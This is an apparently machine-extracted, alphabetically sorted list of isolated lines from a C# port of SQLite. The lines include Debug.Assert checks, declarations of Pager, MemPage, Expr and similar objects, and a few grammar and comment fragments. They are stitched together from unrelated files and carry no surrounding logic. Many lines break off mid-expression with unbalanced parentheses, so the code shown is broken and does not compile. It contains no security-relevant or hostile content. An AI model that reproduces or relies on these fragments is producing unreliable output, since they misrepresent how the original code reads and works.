      Debug.Assert( eMode == PAGER_JOURNALMODE_QUERY
      Debug.Assert( eMode == PAGER_LOCKINGMODE_QUERY
      Debug.Assert( enc == SQLITE_UTF8 
      Debug.Assert( enc >= SQLITE_UTF8 
      Debug.Assert( false )
      Debug.Assert( flags == EXPRDUP_REDUCE 
      Debug.Assert( i < sizeof( int ) 
      Debug.Assert( i <= p.iSize )
      Debug.Assert( i > 0 )
      Debug.Assert( i >= 0 
      Debug.Assert( iCol >= -1 
      Debug.Assert( iCol >= 0 
      Debug.Assert( iCol >= 0 )
      Debug.Assert( iCur < p.nCursor )
      Debug.Assert( iCur >= 0 )
      Debug.Assert( iDb < db.nDb )
      Debug.Assert( iDb == 0 )
      Debug.Assert( iDb == 1 
      Debug.Assert( iDb >= 0 
      Debug.Assert( iDb >= 0 )
      Debug.Assert( iOfst 
      Debug.Assert( iOfst == p.endpoint.iOffset )
      Debug.Assert( iReg > 0 )
      Debug.Assert( iSavepoint >= 0 
      Debug.Assert( iSrcPg != PENDING_BYTE_PAGE( p.pSrc.pBt ) )
      Debug.Assert( iStart <= pSrc.nSrc )
      Debug.Assert( iStart >= 0 )
      Debug.Assert( iTarget > 0 )
      Debug.Assert( id != null )
      Debug.Assert( idx < p.nResColumn )
      Debug.Assert( isDeferred == 0 
      Debug.Assert( isDirectMode == false )
      Debug.Assert( isMainJrnl != 0 
      Debug.Assert( isOpen( pPager.fd ) 
      Debug.Assert( isOpen( pPager.fd ) )
      Debug.Assert( isOpen( pPager.jfd ) 
      Debug.Assert( isOpen( pPager.jfd ) )
      Debug.Assert( isSavepnt != 0 
      Debug.Assert( j >= 0 
      Debug.Assert( jumpIfNull == SQLITE_JUMPIFNULL 
      Debug.Assert( locktype != PENDING_LOCK )
      Debug.Assert( locktype != RESERVED_LOCK 
      Debug.Assert( locktype <= SHARED_LOCK )
      Debug.Assert( mask == -1 
      Debug.Assert( n <= 9 )
      Debug.Assert( n == ( db.nSavepoint 
      Debug.Assert( n == pBlob.Length )
      Debug.Assert( n > 0 )
      Debug.Assert( n >= 0 )
      Debug.Assert( nAlloc >= pNew.nCol 
      Debug.Assert( nCol == pSelect.pEList.nExpr /
      Debug.Assert( nExtra < 1000 )
      Debug.Assert( nExtra >= 1 )
      Debug.Assert( nKey >= 0 )
      Debug.Assert( nOut < SQLITE_MAX_LENGTH )
      Debug.Assert( nTemp >= 20 )
      Debug.Assert( nTerm > 0 )
      Debug.Assert( nWrite == db.writeVdbeCnt )
      Debug.Assert( newIdx != -1 
      Debug.Assert( newPgno > 0 )
      Debug.Assert( null == p.pGroupBy )
      Debug.Assert( null == pPager.aSavepoint 
      Debug.Assert( null == pPgOld 
      Debug.Assert( offset % pPager.sectorSize == 0 )
      Debug.Assert( offset >= c )
      Debug.Assert( op != TK_EQ 
      Debug.Assert( op != TK_GE 
      Debug.Assert( op != TK_GT 
      Debug.Assert( op != TK_IN 
      Debug.Assert( op != TK_ISNULL 
      Debug.Assert( op != TK_LE 
      Debug.Assert( op != TK_LT 
      Debug.Assert( op == OP_Null 
      Debug.Assert( op == SAVEPOINT_RELEASE 
      Debug.Assert( op == TK_INSERT 
      Debug.Assert( op == TK_UPDATE 
      Debug.Assert( op > 0 
      Debug.Assert( op >= 0 
      Debug.Assert( opcode == OP_OpenWrite 
      Debug.Assert( opcode > 0 
      Debug.Assert( p != null 
      Debug.Assert( p != null )
      Debug.Assert( p != null /
      Debug.Assert( p == null 
      Debug.Assert( p == null )
      Debug.Assert( p.aColName != null )
      Debug.Assert( p.aOp == null 
      Debug.Assert( p.bDestLocked != 0 )
      Debug.Assert( p.db != null )
      Debug.Assert( p.db == null 
      Debug.Assert( p.explain != 0 )
      Debug.Assert( p.explain == 0 )
      Debug.Assert( p.iLimit == 0 )
      Debug.Assert( p.isSorted == false )
      Debug.Assert( p.magic == VDBE_MAGIC_INIT )
      Debug.Assert( p.magic == VDBE_MAGIC_RUN )
      Debug.Assert( p.nOp > 0 
      Debug.Assert( p.nOp > 0 )
      Debug.Assert( p.nRef == 1 )
      Debug.Assert( p.nRef > 0 )
      Debug.Assert( p.pBt.inTransaction != TRANS_NONE 
      Debug.Assert( p.pBt.inTransaction >= p.inTrans )
      Debug.Assert( p.pEList != null 
      Debug.Assert( p.pGroupBy == null 
      Debug.Assert( p.pGroupBy == null )
      Debug.Assert( p.pOffset == null 
      Debug.Assert( p.pOffset == null )
      Debug.Assert( p.pOrderBy != null )
      Debug.Assert( p.pPrior == null )
      Debug.Assert( p.rc != SQLITE_ROW 
      Debug.Assert( p.rc == SQLITE_OK 
      Debug.Assert( p1 >= 0 
      Debug.Assert( pAlias != null )
      Debug.Assert( pCache != null )
      Debug.Assert( pCache.bPurgeable 
      Debug.Assert( pCache.nPage == nPage )
      Debug.Assert( pCache.nRef == 0 
      Debug.Assert( pCol.zType == null )
      Debug.Assert( pColl != null 
      Debug.Assert( pColl != null )
      Debug.Assert( pDatabase == null 
      Debug.Assert( pDest != null 
      Debug.Assert( pDest.pTable != pSrc.pTable )
      Debug.Assert( pEList != null 
      Debug.Assert( pEList != null )
      Debug.Assert( pEList == null 
      Debug.Assert( pEList.a[0].pExpr != null )
      Debug.Assert( pExpr.op != TK_EQ 
      Debug.Assert( pExpr.op != TK_GE 
      Debug.Assert( pExpr.op != TK_GT 
      Debug.Assert( pExpr.op != TK_ISNULL 
      Debug.Assert( pExpr.op != TK_LE 
      Debug.Assert( pExpr.op != TK_LT 
      Debug.Assert( pExpr.op != TK_NE 
      Debug.Assert( pExpr.op != TK_NOTNULL 
      Debug.Assert( pExpr.op == TK_EQ 
      Debug.Assert( pExpr.op == TK_OR )
      Debug.Assert( pExpr.pLeft != null )
      Debug.Assert( pFile != null )
      Debug.Assert( pFile.locktype != NO_LOCK 
      Debug.Assert( pFrom.db == null 
      Debug.Assert( pH != null )
      Debug.Assert( pId2 != null )
      Debug.Assert( pIdx.nColumn >= nEq )
      Debug.Assert( pIn != null )
      Debug.Assert( pIndexedBy != null )
      Debug.Assert( pItem != null 
      Debug.Assert( pKey != null )
      Debug.Assert( pKeyDup == null )
      Debug.Assert( pLeft != null )
      Debug.Assert( pList != null )
      Debug.Assert( pList != null /
      Debug.Assert( pList == null 
      Debug.Assert( pList.a != null 
      Debug.Assert( pList.a != null )
      Debug.Assert( pList.nExpr <= pList.nAlloc )
      Debug.Assert( pMaskSet.n < ArraySize( pMaskSet.ix ) )
      Debug.Assert( pMaskSet.n <= sizeof( Bitmask ) 
      Debug.Assert( pMem.db == null 
      Debug.Assert( pNC != null )
      Debug.Assert( pNC.pSrcList != null )
      Debug.Assert( pName.nSrc == 1 )
      Debug.Assert( pName1 != null )
      Debug.Assert( pName2 != null 
      Debug.Assert( pName2 != null )
      Debug.Assert( pNew != null )
      Debug.Assert( pNew.nCol > 0 )
      Debug.Assert( pOffset == null 
      Debug.Assert( pOld == null 
      Debug.Assert( pOp != null )
      Debug.Assert( pOrWc.nTerm >= 2 )
      Debug.Assert( pOrderBy != null )
      Debug.Assert( pOrderBy.nExpr > 0 )
      Debug.Assert( pOrig != null )
      Debug.Assert( pP4 != null )
      Debug.Assert( pPage.iKey == iOld )
      Debug.Assert( pPage.pCache == pCache )
      Debug.Assert( pPage.pDirtyNext != null 
      Debug.Assert( pPage.pDirtyNext == null 
      Debug.Assert( pPage.pDirtyPrev != null 
      Debug.Assert( pPage.pLruPrev == null 
      Debug.Assert( pPager != null )
      Debug.Assert( pPager.dbSize >= nPage )
      Debug.Assert( pPager.dbSizeValid )
      Debug.Assert( pPager.fd.pMethods != null 
      Debug.Assert( pPager.journalMode != PAGER_JOURNALMODE_OFF 
      Debug.Assert( pPager.journalMode != PAGER_JOURNALMODE_OFF )
      Debug.Assert( pPager.pInJournal == null )
      Debug.Assert( pPager.pPCache != null )
      Debug.Assert( pPager.state != PAGER_UNLOCK )
      Debug.Assert( pPager.state <= PAGER_SHARED )
      Debug.Assert( pPager.state == ( tempFile != 0 
      Debug.Assert( pPager.state == PAGER_RESERVED 
      Debug.Assert( pPager.state == PAGER_SYNCED 
      Debug.Assert( pPager.state > PAGER_UNLOCK )
      Debug.Assert( pPager.state >= PAGER_RESERVED )
      Debug.Assert( pPager.state >= PAGER_SHARED 
      Debug.Assert( pPager.state >= PAGER_SHARED )
      Debug.Assert( pPager.tempFile == false 
      Debug.Assert( pPager.useJournal != 0 )
      Debug.Assert( pParse != null )
      Debug.Assert( pParse == pWalker.pParse )
      Debug.Assert( pParse.apVarExpr == null )
      Debug.Assert( pParse.checkSchema!=0 )
      Debug.Assert( pParse.iCacheLevel >= N )
      Debug.Assert( pParse.nErr == 0 )
      Debug.Assert( pParse.nVar == 0 )
      Debug.Assert( pParse.nVarExpr == 0 )
      Debug.Assert( pParse.nVarExprAlloc == 0 )
      Debug.Assert( pParse.nested < 10 )
      Debug.Assert( pParse.pNewTable == null )
      Debug.Assert( pParse.pNewTrigger == null )
      Debug.Assert( pParse.pVdbe != null /
      Debug.Assert( pPg != null 
      Debug.Assert( pPg.nRef > 0 
      Debug.Assert( pPg.nRef > 0 )
      Debug.Assert( pPg.pPager == pPager )
      Debug.Assert( pPrior.pOrderBy == null )
      Debug.Assert( pPrior.pRightmost != pPrior )
      Debug.Assert( pPrior.pRightmost == p.pRightmost )
      Debug.Assert( pSelect != null )
      Debug.Assert( pSelect.pOffset == null )
      Debug.Assert( pSelect.pSrc != null )
      Debug.Assert( pSrc != null 
      Debug.Assert( pSrc != null )
      Debug.Assert( pSrc.nSrc == 1 )
      Debug.Assert( pStart == null 
      Debug.Assert( pSub != null )
      Debug.Assert( pSubSrc != null )
      Debug.Assert( pTab != null 
      Debug.Assert( pTab != null )
      Debug.Assert( pTab.addColOffset > 0 )
      Debug.Assert( pTab.pSelect == null )
      Debug.Assert( pTabList.nSrc == 1 )
      Debug.Assert( pTable != null )
      Debug.Assert( pTable.nCol >= 0 )
      Debug.Assert( pTable.nRef == 0 )
      Debug.Assert( pTable.pSchema == pTrigger.pSchema 
      Debug.Assert( pTable.pSelect != null )
      Debug.Assert( pTableName.nSrc == 1 )
      Debug.Assert( pTo != null )
      Debug.Assert( pTo.db == null 
      Debug.Assert( pTo.db == pFrom.db )
      Debug.Assert( pTo.nVar == pFrom.nVar )
      Debug.Assert( pToken != null )
      Debug.Assert( pTriggerStep != null )
      Debug.Assert( pVal.db == null 
      Debug.Assert( pVal.enc == ( enc 
      Debug.Assert( pWC.vmask == 0 
      Debug.Assert( pcache1.isInit != 0 )
      Debug.Assert( pcache1.isInit == 0 )
      Debug.Assert( pcache1.pLruHead != pPage 
      Debug.Assert( pgno != 0 )
      Debug.Assert( pgno > 0 )
      Debug.Assert( ppStmt == null )
      Debug.Assert( pzErrMsg != null )
      Debug.Assert( rc != 0 
      Debug.Assert( rc != 0 )
      Debug.Assert( rc != SQLITE_OK 
      Debug.Assert( rc != SQLITE_OK )
      Debug.Assert( rc != SQLITE_ROW )
      Debug.Assert( rc == SQLITE_OK 
      Debug.Assert( rc == SQLITE_OK )
      Debug.Assert( rc == SQLITE_ROW 
      Debug.Assert( rcauth == SQLITE_OK 
      Debug.Assert( scratchAllocOut == 0 )
      Debug.Assert( size == 0 )
      Debug.Assert( sqlite3BtreeCursorIsValid( pCur ) )
      Debug.Assert( sqlite3BtreeCursorIsValid(pCur) )
      Debug.Assert( sqlite3BtreeHoldsAllMutexes( db ) )
      Debug.Assert( sqlite3BtreeHoldsAllMutexes( pParse.db ) )
      Debug.Assert( sqlite3BtreeHoldsMutex( db.aDb[iDb].pBt ) )
      Debug.Assert( sqlite3BtreeHoldsMutex( p.pSrc ) )
      Debug.Assert( sqlite3SafetyCheckSickOrOk( db ) )
      Debug.Assert( sqlite3VdbeDb( v ) == db )
      Debug.Assert( sqlite3_mutex_held( db.mutex ) )
      Debug.Assert( sqlite3_mutex_held( mem0.mutex ) )
      Debug.Assert( sqlite3_mutex_held( p.s.db.mutex ) )
      Debug.Assert( sqlite3_mutex_held( pCtx.s.db.mutex ) )
      Debug.Assert( sqlite3_mutex_held( pCur.pBtree.db.mutex ) )
      Debug.Assert( sqlite3_mutex_held( pcache1.mutex ) )
      Debug.Assert( sqlite3_mutex_held( sqlite3MutexAlloc( SQLITE_MUTEX_STATIC_MASTER ) ) )
      Debug.Assert( sqlite3_mutex_held( sqlite3VdbeDb( p ).mutex ) )
      Debug.Assert( target > 0 
      Debug.Assert( target > 0 )
      Debug.Assert( tempFile == PAGER_LOCKINGMODE_NORMAL
      Debug.Assert( tr_tm == TRIGGER_BEFORE 
      Debug.Assert( u <= pKeyInfo.nField 
      Debug.Assert( useJournal 
      Debug.Assert( v != null )
      Debug.Assert( v != null /
      Debug.Assert( var < COLNAME_N )
      Debug.Assert( vfsList != null )
      Debug.Assert( z != null 
      Debug.Assert( z != null )
      Debug.Assert( z.Length != 0 )
      Debug.Assert( zCol != null )
      Debug.Assert( zColl != null )
      Debug.Assert( zData != null )
      Debug.Assert( zName != null )
      Debug.Assert( zNum[0] >= '0' 
      Debug.Assert( zPattern == sqlite3_value_text( argv[1] ) )
      Debug.Assert( zRep == sqlite3_value_text( argv[2] ) )
      Debug.Assert( zSql != null )
      Debug.Assert( zSrcData != null )
      Debug.Assert( zStr == sqlite3_value_text( argv[0] ) )
      Debug.Assert( zTabName != null 
      Debug.Assert( zTemp != null )
      Debug.Assert(!pBt.readOnly)
      Debug.Assert((info.nData 
      Debug.Assert((pIdxKey == null) == (pCur.pKeyInfo == null))
      Debug.Assert((pKey == null) == (pCur.pKeyInfo == null))
      Debug.Assert((pgno > 0 
      Debug.Assert((start 
      Debug.Assert(0 == pCur.apPage[0].intKey 
      Debug.Assert(CURSOR_FAULT > CURSOR_REQUIRESEEK)
      Debug.Assert(CURSOR_INVALID < CURSOR_REQUIRESEEK)
      Debug.Assert(CURSOR_VALID < CURSOR_REQUIRESEEK)
      Debug.Assert(CURSOR_VALID == pCur.eState)
      Debug.Assert(cbrk >= iCellFirst)
      Debug.Assert(cntNew[0] > 0 
      Debug.Assert(cursorHoldsMutex(pCur))
      Debug.Assert(db != null)
      Debug.Assert(eType == PTRMAP_OVERFLOW2 
      Debug.Assert(i != YY_REDUCE_USE_DFLT)
      Debug.Assert(i >= 0 
      Debug.Assert(iIdx <= pParent.nCell)
      Debug.Assert(iLastPg > nFin)
      Debug.Assert(iLookAhead != YYNOCODE)
      Debug.Assert(iPage > 1)
      Debug.Assert(iStatement > 0)
      Debug.Assert(iStatement > p.db.nSavepoint)
      Debug.Assert(idx <= pPage.nCell)
      Debug.Assert(idx >= 0 
      Debug.Assert(idx >= 1 
      Debug.Assert(info.Equals(pCur.info))
      Debug.Assert(info.nData == (u32)(nData 
      Debug.Assert(info.nHeader == nHeader)
      Debug.Assert(info.nKey == nKey)
      Debug.Assert(j == nCell)
      Debug.Assert(n == 4 - 4 
      Debug.Assert(nByte < pPage.pBt.usableSize - 8)
      Debug.Assert(nByte >= 0)
      Debug.Assert(nCell >= 0 
      Debug.Assert(nNew > 0)
      Debug.Assert(nOld > 0)
      Debug.Assert(nRef == sqlite3PagerRefcount(pPager))
      Debug.Assert(nReserve >= -1 
      Debug.Assert(nReserve >= 0 
      Debug.Assert(nSize == debuginfo.nSize)
      Debug.Assert(next == 0 
      Debug.Assert(null == pCur.pKey)
      Debug.Assert(null == pMemPage 
      Debug.Assert(ovflPgno == 0 
      Debug.Assert(p != null)
      Debug.Assert(p == null 
      Debug.Assert(p.inTrans == TRANS_WRITE)
      Debug.Assert(p.inTrans > TRANS_NONE 
      Debug.Assert(p.inTrans > TRANS_NONE)
      Debug.Assert(p.pBt.pPager != null)
      Debug.Assert(p.wantToLock == 0 
      Debug.Assert(pBt != null 
      Debug.Assert(pBt.autoVacuum == true 
      Debug.Assert(pBt.autoVacuum)
      Debug.Assert(pBt.db != null)
      Debug.Assert(pBt.inTransaction == TRANS_WRITE 
      Debug.Assert(pBt.inTransaction == TRANS_WRITE)
      Debug.Assert(pBt.incrVacuum == true 
      Debug.Assert(pBt.maxLeaf 
      Debug.Assert(pBt.pCursor == null 
      Debug.Assert(pBt.pPage1 != null 
      Debug.Assert(pBt.pPage1 != null)
      Debug.Assert(pBt.pPage1 == null)
      Debug.Assert(pBt.pageSize >= 512 
      Debug.Assert(pBt.usableSize <= pBt.pageSize 
      Debug.Assert(pBt.usableSize > 4)
      Debug.Assert(pCell != 0)
      Debug.Assert(pCell != null)
      Debug.Assert(pChild.nCell == pRoot.nCell)
      Debug.Assert(pCsr == null 
      Debug.Assert(pCur != null 
      Debug.Assert(pCur.aiIdx[pCur.iPage] < pCur.apPage[pCur.iPage].nCell)
      Debug.Assert(pCur.aiIdx[pCur.iPage] < pPage.nCell)
      Debug.Assert(pCur.apPage[0].intKey != 0 
      Debug.Assert(pCur.apPage[pCur.iPage] != null)
      Debug.Assert(pCur.apPage[pCur.iPage].isInit != 0)
      Debug.Assert(pCur.apPage[pCur.iPage].nCell > 0 
      Debug.Assert(pCur.apPage[pCur.iPage].nOverflow == 0)
      Debug.Assert(pCur.cachedRowid == iRowid)
      Debug.Assert(pCur.eState == CURSOR_INVALID 
      Debug.Assert(pCur.eState == CURSOR_VALID 
      Debug.Assert(pCur.eState == CURSOR_VALID)
      Debug.Assert(pCur.eState >= CURSOR_REQUIRESEEK)
      Debug.Assert(pCur.iPage < BTCURSOR_MAX_DEPTH)
      Debug.Assert(pCur.iPage > 0)
      Debug.Assert(pCur.iPage >= 0 
      Debug.Assert(pCur.wrFlag != 0 
      Debug.Assert(pCur.wrFlag != 0)
      Debug.Assert(pDbPage.pBt == pBt)
      Debug.Assert(pExcept == null 
      Debug.Assert(pP1 != null)
      Debug.Assert(pPage != null)
      Debug.Assert(pPage == sqlite3PagerGetExtra(pPage.pDbPage))
      Debug.Assert(pPage.aData == sqlite3PagerGetData(pPage.pDbPage))
      Debug.Assert(pPage.cellOffset == hdr 
      Debug.Assert(pPage.hdrOffset == (pPage.pgno == 1 
      Debug.Assert(pPage.intKey != 0 
      Debug.Assert(pPage.isInit != 0)
      Debug.Assert(pPage.leaf != 0 
      Debug.Assert(pPage.leaf == 0 
      Debug.Assert(pPage.nCell <= MX_CELL(pPage.pBt) 
      Debug.Assert(pPage.nCell == 0)
      Debug.Assert(pPage.nFree >= nByte)
      Debug.Assert(pPage.nOverflow <= ArraySize(pPage.aOvfl))
      Debug.Assert(pPage.nOverflow == 0)
      Debug.Assert(pPage.nOverflow == 1)
      Debug.Assert(pPage.pBt != null)
      Debug.Assert(pPage.pBt.usableSize <= SQLITE_MAX_PAGE_SIZE)
      Debug.Assert(pPage.pgno == sqlite3PagerPagenumber(pPage.pDbPage))
      Debug.Assert(pParent.isInit != 0)
      Debug.Assert(pParent.nOverflow == 0 
      Debug.Assert(pPgno != PENDING_BYTE_PAGE(pBt))
      Debug.Assert(pRoot.isInit != 0 
      Debug.Assert(pRoot.nOverflow > 0)
      Debug.Assert(pRoot.pgno == pCur.pgnoRoot)
      Debug.Assert(pbegin > addr 
      Debug.Assert(rc != SQLITE_OK 
      Debug.Assert(rc == SQLITE_OK 
      Debug.Assert(rc == SQLITE_OK)
      Debug.Assert(size >= 0)
      Debug.Assert(sqlite3BtreeHoldsMutex(p))
      Debug.Assert(sqlite3PagerGetData(pPage.pDbPage) == data)
      Debug.Assert(sqlite3PagerGetExtra(pPage.pDbPage) == pPage)
      Debug.Assert(sqlite3PagerIswriteable(pChild.pDbPage))
      Debug.Assert(sqlite3PagerIswriteable(pPage.pDbPage))
      Debug.Assert(sqlite3PagerIswriteable(pParent.pDbPage))
      Debug.Assert(sqlite3PagerIswriteable(pRoot.pDbPage))
      Debug.Assert(sqlite3PagerPageRefcount(pData) > 0)
      Debug.Assert(sqlite3PagerPagenumber(pPage.pDbPage) == pPage.pgno)
      Debug.Assert(sqlite3_mutex_held(db.mutex))
      Debug.Assert(sqlite3_mutex_held(p.db.mutex))
      Debug.Assert(sqlite3_mutex_held(pBt.db.mutex))
      Debug.Assert(sqlite3_mutex_held(pBt.mutex))
      Debug.Assert(sqlite3_mutex_held(pCur.pBtree.db.mutex))
      Debug.Assert(sqlite3_mutex_held(pPage.pBt.mutex))
      Debug.Assert(start <= iLast)
      Debug.Assert(start >= pPage.hdrOffset 
      Debug.Assert(stateno <= YY_REDUCE_MAX)
      Debug.Assert(szNew <= MX_CELL_SIZE(pBt))
      Debug.Assert(top 
      Debug.Assert(wrFlag == 0 
      Debug.Assert(yy_lookahead[i] == iLookAhead)
      Debug.Assert(yyminor.yy0.z.Length > 0)
      Debug.Assert(zMagicHeader.Length == 16)
      Debugger.Break()
      EXPR_FULLSIZE
      EXPR_REDUCEDSIZE   
      EXPR_TOKENONLYSIZE 
      Expr ExprDummy = null
      Expr p
      Expr p = pExpr
      Expr pDflt
      Expr pDup
      Expr pE
      Expr pExpr
      Expr pExpr = pTerm.pExpr
      Expr pHaving
      Expr pNew
      Expr pNew = null
      Expr pOrig
      Expr pRowidExpr = null
      Expr pWhere
      Expr pX = pTerm.pExpr
      ExprList NullOrderby = null
      ExprList pEList
      ExprList pEList = new ExprList()
      ExprList pEList = p.pEList
      ExprList pGroupBy
      ExprList pList
      ExprList pNew
      ExprList pOrderBy
      ExprList pOrderBy = p.pOrderBy
      ExprList_item pItem
      ExprList_item pListItem
      ExprList_item pOldItem
      ExprList_item pTerm
      ExprList_item[] a
      ExprSetIrreducible( pExpr )
      FILETIME ft = new FILETIME()
      FKey pFKey
      FKey pFKey = null
      FileAccess dwDesiredAccess
      FileAttributes attr = 0
      FileChunk pChunk
      FileMode dwCreationDisposition
      FileOptions dwFlagsAndAttributes
      FileShare dwShareMode
      FileStream fs = null
      FuncDef attach_func = new FuncDef(
      FuncDef detach_func = new FuncDef(
      FuncDef p
      FuncDef pBest = null
      FuncDef pDef
      FuncDef pOther
      FuncDefHash pHash = sqlite3GlobalFunctions
      FuncDef[] aBuiltinFunc =  {
      FuncDef[] aDateTimeFuncs = new FuncDef[]  {
      FuncDef[] aFunc = aBuiltinFunc
      FuncDef[] aFunc = aDateTimeFuncs
      HANDLE handle
      Hash hash
      Hash pHash
      Hash pHash = db.aDb[iDb].pSchema.idxHash
      Hash pHash = db.aDb[iDb].pSchema.trigHash
      Hash temp1
      Hash temp2
      HashElem elem
      HashElem i
      HashElem k
      HashElem new_elem
      HashElem next_elem
      HashElem pElem
      HashElem pHead
      HashElem prev
      ISBM 0-943396-61-1
      IdList pNew
      Index p = null
      Index pIdx
      Index pIndex
      Index pIndex = null
      Index pOld
      Index pProbe
      InitData initData = new InitData()
      InitData pData = (InitData)pInit
      Int64 pNum
      IntegrityCk sCheck = new IntegrityCk()
      Jean Meeus
      KeyInfo pInfo
      KeyInfo pKey
      KeyInfo pKey = new KeyInfo()
      KeyInfo pKeyDup = null
      KeyInfo pKeyInfo
      KeyInfo pKeyMerge
      Keyword[] aKeyword = new Keyword[]{
      L: yield X
      LONGDOUBLE_TYPE d
      LONGDOUBLE_TYPE realvalue
      M: ...
      M: open write cursor to <table> and its indices
      MATCH => ID 
      Mem _M
      Mem m = new Mem()
      Mem mem1 = new Mem()
      Mem p = (Mem)pVal
      Mem p = new Mem()
      Mem p = pVal
      Mem pArg = (Mem)argv[0]
      Mem pBest
      Mem pColName
      Mem pIn1 = null
      Mem pIn2 = null
      Mem pIn3 = null
      Mem pMem
      Mem pMem = (Mem)pVal
      Mem pMem = p.aMem[p.nMem - iCur]
      Mem pOut
      Mem pOut = null
      Mem pVar
      MemJournal p = (MemJournal)pJfd
      MemPage pChild = null
      MemPage pNew = new MemPage()
      MemPage pNewPage = new MemPage()
      MemPage pOvfl = null
      MemPage pP1
      MemPage pPage
      MemPage pPage = (MemPage)sqlite3PagerGetExtra(pDbPage)
      MemPage pPage = new MemPage()
      MemPage pPage = null
      MemPage pPage = pCur.apPage[pCur.iPage]
      MemPage pPage1
      MemPage pPage1 = new MemPage()
      MemPage pPage1 = pBt.pPage1
      MemPage pPrevTrunk = null
      MemPage pPtrPage = new MemPage()
      MemPage pRoot
      MemPage pRoot = new MemPage()
      MemPage pToRelease = null
      MemPage pTrunk = null
      MemPage[] apCopy = new MemPage[NB]
      MemPage[] apNew = new MemPage[NB 
      MemPage[] apOld = new MemPage[NB]
      NameContext nc
      NameContext pNC
      NameContext pNC = pWalker.u.pNC
      NameContext pOuterNC
      NameContext pTopNC = pNC
      NameContext sNC
      NameContext sNC = new NameContext()
      NameContext sName
      Op pOp
      OpenCounter( 
      OpenCounter( -1 )
      PAGER_INCR( ref iValue )
      PAGER_INCR( ref pPager.nRead )
      PCache p = pPage.pCache
      PCache pCache
      PCache pCache = p.pCache
      PCache1 pCache
      PCache1 pCache = (PCache1)p
      PCache1 pCache = p
      PCache1 pCache = pPage.pCache
      PRAGMA [database.]id [= value]
      Pager pDestPager = sqlite3BtreePager( p.pDest )
      Pager pPager
      Pager pPager = (Pager)p
      Pager pPager = null
      Pager pPager = pBt.pPager
      Pager pPager = pPg.pPager
      Parse pParse
      Parse pParse = pNC.pParse
      Parse pParse = pWC.pParse
      Parse pParse = pWInfo.pParse
      Parse pParse = pWalker.pParse
      Parse pParse = yypParser.pParse
      Parse[] SaveBuf = new Parse[10]
      PgHdr p
      PgHdr p = null
      PgHdr pDirty
      PgHdr pPage = null
      PgHdr pPg
      PgHdr pPg = null
      PgHdr pPg = pDbPage
      PgHdr pPg = pcache1Alloc( pCache.szPage )
      PgHdr pPgOld
      PgHdr pTail = result
      PgHdr result = new PgHdr()
      PgHdr1 p
      PgHdr1 pPage = null
      PgHdr1 pp
      PgHdr1[] apNew
      PgHdr[] a
      Pgno i
      Pgno iDbPage = pDbPage.pgno
      Pgno iLastPg = pagerPagecount(pBt)
      Pgno iPtrmap
      Pgno iPtrmapParent = 0
      Pgno iTable
      Pgno iTrunk = 0
      Pgno mxPage
      Pgno nFreeList
      Pgno next = 0
      Pgno origPgno
      Pgno ovflPgno
      Pgno pgno
      Pgno pgno = 0
      Pgno pgno = pPage.pgno
      Pgno pgno = pPg.pgno
      Pgno pgnoChild = 0
      Pgno pgnoNew = 0
      Pgno pgnoOvfl = 0
      Pgno pgnoRoot = 0
      QUERY => ID 
      RAISE => ID 
      RefTime = RefTime.AddSeconds( Convert.ToDouble( baseTime ) ).ToLocalTime()
      RowSetEntry head = new RowSetEntry()
      RowSetEntry p
      RowSetEntry pEntry
      RowSetEntry pLast
      RowSetEntry pLeft
      RowSetEntry pTail
      RowSetEntry[] aBucket = new RowSetEntry[40]
      SELECT a
      SHARED lock on the database file. Immediately after obtaining
      SQLITE_OPEN_EXCLUSIVE 
      SQLITE_OPEN_FULLMUTEX
      SQLITE_OPEN_MAIN_DB 
      SQLITE_OPEN_MAIN_JOURNAL 
      SQLITE_OPEN_MASTER_JOURNAL 
      SQLITE_OPEN_NOMUTEX 
      SQLITE_OPEN_READWRITE 
      SQLITE_OPEN_SUBJOURNAL 
      SQLITE_OPEN_TEMP_DB 
      SQLITE_OPEN_TEMP_JOURNAL 
      SQLITE_OPEN_TRANSIENT_DB 
      Savepoint p
      Schema p
      Schema pSchema = db.aDb[iDb].pSchema
      Schema pSchema = null
      Schema pSchema = p
      Schema pTempSchema = pParse.db.aDb[1].pSchema
      Schema pTmpSchema = pParse.db.aDb[1].pSchema
      Select p
      Select pDelete = null
      Select pDup
      Select pLeftmost
      Select pNew
      Select pParent
      Select pPrior
      Select pSel
      Select pSub
      Select pSub1
      SelectDest dest
      SelectDest dest = new SelectDest()
      SelectDest destA = new SelectDest()
      SelectDest destB = new SelectDest()
      SrcList pNew
      SrcList pSrc
      SrcList pSrcList = pNC.pSrcList
      SrcList pSubSrc
      SrcList pTabList
      SrcList pTabList = new SrcList()
      SrcList pTabList = pWInfo.pTabList
      SrcList_item pFrom
      SrcList_item pItem
      SrcList_item pItem = pSrc.a[0]
      SrcList_item pLeft
      SrcList_item pMatch = null
      SrcList_item pRight
      SrcList_item pSubitem
      SrcList_item pTabItem
      StrAccum acc = new StrAccum()
      StrAccum pAccum
      StrAccum pAccum = null
      StringBuilder sb = new StringBuilder( nIn )
      StringBuilder sbZ = new StringBuilder( z.Length )
      StringBuilder z = new StringBuilder( zMod.ToLower() )
      StringBuilder zBase = new StringBuilder( SQLITE_PRINT_BUF_SIZE )
      StringBuilder zBlob
      StringBuilder zBuf = new StringBuilder( SQLITE_PRINT_BUF_SIZE )
      StringBuilder zErr = new StringBuilder(100)
      StringBuilder zExtra = new StringBuilder()
      StringBuilder zFullpath = new StringBuilder( MAX_PATH 
      StringBuilder zHex = new StringBuilder( n 
      StringBuilder zPathname = null
      StringBuilder zRandom = new StringBuilder( 20 )
      StringBuilder zStmt
      StringBuilder zTemp = new StringBuilder( 100 )
      StringBuilder zTmpname = new StringBuilder( MAX_PATH 
      SumCtx p
      SumCtx p = null
      System.TimeSpan timeSpan = date - unixStartTime
      TABLE => nothing 
      Table p
      Table p = null
      Table p = pParse.pNewTable
      Table pNew
      Table pSelTab
      Table pSrc
      Table pStat
      Table pTab
      Table pTab = null
      Table pTab = pIdx.pTable
      Table pTab = pIndex.pTable
      Table pTab = pParse.pNewTable
      Table pTable
      The compiler [with /fp:precise] will properly handle comparisons
      This option [-ffast-math] should never be turned on by any
      Thread.Sleep( ( microsec 
      Token nameToken = new Token()
      Token nullId = new Token()
      Token p
      Token pId = new Token()
      Token pName = new Token()
      Token pName = null
      Token pObjName = new Token()
      Token pTableName = null
      Token sEnd
      Token tname = new Token()
      Token x = new Token()
      Token[] apAll = new Token[3]
      Trigger p
      Trigger pList = null
      Trigger pTrig
      Trigger pTrig = pParse.pNewTrigger
      Trigger pTrigger
      Trigger pTrigger = null
      TriggerStack trigStackEntry = new TriggerStack()
      TriggerStep pTriggerStep
